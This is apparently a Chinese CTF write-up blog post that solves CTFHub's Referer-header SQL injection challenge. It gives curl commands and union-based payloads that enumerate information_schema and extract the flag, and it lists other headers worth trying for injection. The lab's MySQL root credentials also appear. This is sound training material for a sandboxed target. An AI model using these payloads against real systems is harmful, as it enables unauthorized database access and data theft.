---
layout: post
title: CTFHub Refer注入Writeup
date: "2026-11-23 18:08:00 +0800"
categories: [CTF, CTFHub, Web]
tags: [ctfhub, mysql, sql-injection]
---

## 一、学习环境

- 靶机：CTFHub技能树Refer注入
- 地址：http://challenge-bebabe39469e1bd8.sandbox.ctfhub.com:10800
- 本地环境：OWASP BWA，192.168.216.129
- SSH：ssh bwa
- MySQL：mysql -u root -powaspbwa
- 常用库：dvwa、owasp10、bricks、peruggia、mutillidae
- 铁律：全程不用use，跨库一律写 库名.表名，或在information_schema里用where table_schema过滤

## 二、题目信息

- 平台：CTFHub
- 题型：Web，SQL注入
- 考点：Referer注入、union跨库取数、length与hex核对

## 三、解题思路

页面没有输入框，URL也没有参数，打开只显示一条新闻。

把Referer请求头当成输入，先填数字1，回显的SQL变成id=1，页面显示ID为1、Data为ctfhub。

这说明程序把Referer的值拼进了SQL。注入点从URL换到了请求头的来源页字段。

## 四、解题步骤

1、确认注入点在Referer。用curl指定来源页：

```
curl -e 1 http://靶机地址/
```

回显select * from news where id=1，并且显示ID为1、Data为ctfhub。

2、确认可控。Referer换成1 and 1=2，结果区空白，说明参与运算。

3、数列数。Referer换成1 order by 2正常，换成1 order by 3空白，两列。

4、找回显位。Referer换成999 union select 1,2，页面显示1和2。用999是因为1有数据，伪造行会被挤到第二行。

5、读库名。Referer换成999 union select 1,database()，返回sqli。

6、读表名。Referer换成：

```
999 union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x73716c69
```

0x73716c69是sqli的十六进制。返回zwputolnjz和news，随机名那张是目标。

7、读字段名。Referer换成：

```
999 union select 1,group_concat(column_name) from information_schema.columns where table_schema=0x73716c69 and table_name=0x7a777075746f6c6e6a7a
```

0x7a777075746f6c6e6a7a是表名zwputolnjz的十六进制。返回字段名lktuztmkao。

8、取数据。Referer换成：

```
999 union select 1,group_concat(lktuztmkao) from sqli.zwputolnjz
```

Data位置返回ctfhub{1271c184e5c9e228f2cb6a65}，即flag。

9、核对。用length确认长度32，用hex输出整串的十六进制，和肉眼读到的逐字节对照，避免漏字符。

## 五、踩坑记录

**坑一：在地址栏找不到参数**

现象：页面没有输入框，URL没有id，不知道从哪注入。

原因：参数在Referer请求头里。

解决：用curl的-e参数，或者Burp抓包改Referer那一行。

**坑二：以为Referer只是来源统计**

现象：默认Referer是上一个页面的地址，看不出和数据库有关系。

原因：程序可能把来源页写进访问日志表，或者直接当查询条件。本题是后者。

解决：逐个请求头试，Referer、User-Agent、Cookie、X-Forwarded-For都可能被拼进SQL。

**坑三：抄flag漏字符**

现象：连续相同字符容易看串，抄写时少一个。

原因：终端字体下8和8、0和O相邻时容易误读。

解决：先看length是不是32，再用hex把整串转十六进制，逐字节核对。

## 六、问题与解答

**问：Referer是什么。**

答：请求头里的来源页地址，告诉服务端你是从哪个页面点过来的。服务端常用它做来源统计和防盗链。

**问：为什么Referer能被注入。**

答：程序把它直接拼进SQL，比如写日志或当查询条件，又没有过滤，就会像URL参数一样被执行。

**问：怎么改Referer。**

答：curl加-e参数；Burp抓包改Referer那一行；浏览器插件也能改。批量测试用前两种。

**问：为什么要用length和hex核对。**

答：肉眼抄写会漏字符，提交就会报flag错误。length先确认位数，hex再确认每个字节，两步就能定位问题。

## 七、总结

1、请求头是常被忽略的注入入口，Referer、User-Agent、Cookie都要试。
2、判断方法：把请求头换成数字，看回显的SQL有没有变化。
3、手法不变：数两列、找回显位、union查库表字段、取数据。
4、flag交付前做两道校验：length位数、hex字节对照。
